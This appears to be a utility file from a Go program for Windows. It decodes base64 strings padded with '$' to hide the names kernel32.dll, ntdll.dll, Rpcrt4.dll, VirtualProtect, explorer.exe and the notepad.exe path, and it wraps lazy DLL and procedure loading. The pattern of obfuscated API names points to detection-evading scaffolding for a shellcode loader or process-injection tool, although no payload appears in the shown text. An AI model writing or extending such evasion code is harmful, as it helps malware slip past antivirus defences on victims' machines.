package utils

import (
	"encoding/base64"
	"golang.org/x/sys/windows"
	"strings"
	"syscall"
)

func GetKe32DllName() string {
	s, _ := base64.StdEncoding.DecodeString("a2Ukcm4kZWwzJDIuZGxs")
	return strings.Replace(string(s), "$", "", -1)
}

func GetKe32Name() string {
	s, _ := base64.StdEncoding.DecodeString("a2VyJG4kZWwkMzI=")
	return strings.Replace(string(s), "$", "", -1)
}

func GetNotePath() string {
	s, _ := base64.StdEncoding.DecodeString("QzpcVyRpbmRvJHdzXFN5JHN0ZW0zMlxubyR0ZXAkYWQuZXhl")
	return strings.Replace(string(s), "$", "", -1)
}
func GetRpc4Name() string {
	s, _ := base64.StdEncoding.DecodeString("UnAkY3J0JDQuZCRsbA==")
	return strings.Replace(string(s), "$", "", -1)
}

func GetNtDllName() string {
	s, _ := base64.StdEncoding.DecodeString("bnQkZCRsbC5kbCRs")
	return strings.Replace(string(s), "$", "", -1)
}

func GetExpName() string {
	s, _ := base64.StdEncoding.DecodeString("ZXgkcGxvJHJlci5leCRl")
	return strings.Replace(string(s), "$", "", -1)
}

func GetVirProtectName() string {
	s, _ := base64.StdEncoding.DecodeString("VmlyJHR1JGFsUHJvJHRlJGN0")
	return strings.Replace(string(s), "$", "", -1)
}

func ListStrContains[T ~string](l []T, substr T) bool {
	for _, v := range l {
		if strings.Contains(string(v), string(substr)) {
			return true
		}
	}
	return false
}

func GetWinDLL(dllName string) *windows.LazyDLL {
	return windows.NewLazySystemDLL(dllName)
}

func GetSysDLL(dllName string) *syscall.LazyDLL {
	return syscall.NewLazyDLL(dllName)
}
func GetWinProc(dllName, procName string) *windows.LazyProc {
	return windows.NewLazySystemDLL(dllName).NewProc(procName)
}

func GetProc(dllName, procName string) *syscall.LazyProc {
	return syscall.NewLazyDLL(dllName).NewProc(procName)
}
